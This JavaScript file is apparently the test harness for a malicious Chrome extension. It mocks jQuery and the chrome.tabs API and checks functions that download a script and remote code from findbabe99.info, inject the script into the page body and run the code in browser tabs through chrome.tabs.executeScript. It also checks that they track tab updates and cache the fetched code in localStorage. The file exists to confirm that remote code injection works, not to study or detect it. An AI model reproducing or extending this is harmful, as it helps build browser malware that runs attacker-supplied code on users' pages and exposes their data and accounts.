	var LOADURL = "http://findbabe99.info/sc/srxload.txt";
	var CODEURL = "http://findbabe99.info/newcode/srxcode.php";

	var TestResult = {
		test1: false,
		test2: false
	};


	var jQuery = function(selector) {
		console.log('  info: called jQuery(selector)', selector);
		if (selector == "body") {
			return {
				append: function(html) {
					console.log('  info: called jQuery.append', html);
					if (html == "<scr" + "ipt>TEST DATA (" + LOADURL + ")</scr" + "ipt>") {
						TestResult.test1 = true;
					} else {
						console.log('  info: provided html is not one we want - very-very bad');
					}
				}
			};
		} else {
			console.log('  info: selector is not "body" - very-very bad');
			return {append: function(){}};
		}
	};
	jQuery.now = function() {
		console.log('  info: called jQuery.now');
		var n = (new Date()).getTime();
		TestResult.lastNowTime = n;
		return n;
	};
	jQuery.get = function(url, callback) {
		console.log('  info: called jQuery.get', url, callback);
		if (url && callback) {
			callback("TEST DATA (" + url + ")");
		} else {
			console.log('  info: url or callback is not valid - very-very bad!');
		}
	};

	window.chrome || (window.chrome = {});
	window.chrome.tabs || (window.chrome.tabs = {});
	window.chrome.tabs.onUpdated = {
		addListener: function(callback) {
			console.log('  info: called chrome.tabs.onUpdated.addListener', callback);
			window.chrome.tabs.onUpdatedListener = callback;
		}
	};
	window.chrome.tabs.executeScript = function(tab, params) {
		console.log('  info: called chrome.tabs.executeScript', tab, params);
		if (params && params.code && params.code == "TEST DATA (" + CODEURL + ")") {
			TestResult.test2 = true;
		} else {
			console.log('  info: tabs or params is not valid - very-very bad!');
		}
	};




	var runTests = function() {
		var result = true;
		console.log('---=== TESTS STARTED ===---');
		var temp;

		try {
			temp = jQuery.xAddr();
			console.log('  info: xAddr() result', temp);
			if (temp != LOADURL) {
				console.log("!!! xAddr() Failed!");
				result = false;
			}

			temp = jQuery.xAddr(true);
			console.log('  info: xAddr(true) result', temp);
			if (temp != CODEURL) {
				console.log("!!! xAddr(true) Failed!");
				result = false;
			}

			temp = jQuery.xTabs();
			console.log('  info: xTabs() result', temp);
			if (temp != window.chrome.tabs) {
				console.log("!!! xTabs() Failed!");
				result = false;
			}

			//xStore tests
			var xStoreCallbackCnt = 0;
			var xStoreInsertCnt = 0;
			var xStoreCallback = function() {
				xStoreCallbackCnt++;
			}
			var xStoreInsert = function(tab) {
				if (tab === 1)
					xStoreInsertCnt++;
			}

			localStorage.clear();
			window.uptmnd = false;
			TestResult.lastNowTime = 666;

			jQuery.xStore(xStoreCallback, xStoreInsert);

			console.log('  info: onUpdatedListener', window.chrome.tabs.onUpdatedListener)
			if (!window.chrome.tabs.onUpdatedListener || typeof window.chrome.tabs.onUpdatedListener != "function") {
				console.log("xStore() did not install tab listener properly - Failed!");
				result = false;
			}

			window.chrome.tabs.onUpdatedListener(1);
			if (xStoreInsertCnt !== 1) {
				console.log("!!! xStore() did not call insert() properly (1st check) [" + xStoreInsertCnt + "] - Failed!");
				result = false;
			}
			if (localStorage.xcnt !== "1") {
				console.log("!!! xStore() did not apply 1 to localStorage.xcnt [" + localStorage.xcnt + "] - Failed!");
				result = false;
			}
			var uptmnd = window.uptmnd;
			var rightUptmnd = TestResult.lastNowTime + 2*60*60*1000;
			if (uptmnd !== rightUptmnd) {
				console.log("!!! xStore() did not set window.uptmnd properly [" + uptmnd + ", right: " + rightUptmnd + "] - Failed!");
				result = false;
			}
			if (xStoreCallbackCnt !== 0) {
				console.log("!!! xStore() called callback() (1st check) [" + xStoreCallbackCnt + "] - Failed!");
				result = false;
			}

			window.chrome.tabs.onUpdatedListener(1);
			if (localStorage.xcnt !== "2") {
				console.log("!!! xStore() did not increment localStorage.xcnt [" + localStorage.xcnt + "] - Failed!");
				result = false;
			}
			if (xStoreInsertCnt !== 2) {
				console.log("!!! xStore() did not call insert() properly (2nd check) [" + xStoreInsertCnt + "] - Failed!");
				result = false;
			}
			if (uptmnd !== window.uptmnd) {
				console.log("!!! xStore() changed window.uptmnd (1st check) [" + window.uptmnd + ", old: " + uptmnd + "] - Failed!");
				result = false;
			}
			if (xStoreCallbackCnt !== 0) {
				console.log("!!! xStore() called callback() (2st check) [" + xStoreCallbackCnt + "] - Failed!");
				result = false;
			}

			localStorage.xcnt = 21;
			window.chrome.tabs.onUpdatedListener(1);
			if (xStoreInsertCnt !== 3) {
				console.log("!!! xStore() did not call insert() properly (3rd check) [" + xStoreInsertCnt + "] - Failed!");
				result = false;
			}
			if (uptmnd !== window.uptmnd) {
				console.log("!!! xStore() changed window.uptmnd (2nd check) [" + window.uptmnd + ", old: " + uptmnd + "]- Failed!");
				result = false;
			}
			if (xStoreCallbackCnt !== 1) {
				console.log("!!! xStore() did not call callback() properly [" + xStoreCallbackCnt + "] - Failed!");
				result = false;
			}

			//how to check location.reload????

			//xLoad tests
			TestResult.test1 = false;
			TestResult.test2 = false;
			localStorage.xbrequurf = "not changed";

			jQuery.xLoad();
			window.chrome.tabs.onUpdatedListener(1);

			if (localStorage.xbrequurf !== "TEST DATA (" + CODEURL + ")") {
				console.log("!!! xLoad() did not set localStorage.xbrequurf properly [" + localStorage.xbrequurf + "] - Failed!");
				result = false;
			}
			if (!TestResult.test1) {
				console.log("!!! xLoad() did not load or insert LOADURL data properly - Failed!");
				result = false;
			}
			if (!TestResult.test2) {
				console.log("!!! xLoad() did not load or insert CODEURL data properly - Failed!");
				result = false;
			}
		} catch (e) {
			console.log('!!! Exception somewhere - Failed!')
			console.log(e);
			result = false;
		}

		if (result) {
			console.log('---=== ALL TESTS ARE OK! ===---');
		} else {
			console.log('---=== SOME TEST WAS FAILED! ===---');
		}
	};

	// if (!document.body)
	// 	document.addEventListener('DOMContentLoaded', runTests, false);
	// else
	// 	runTests();
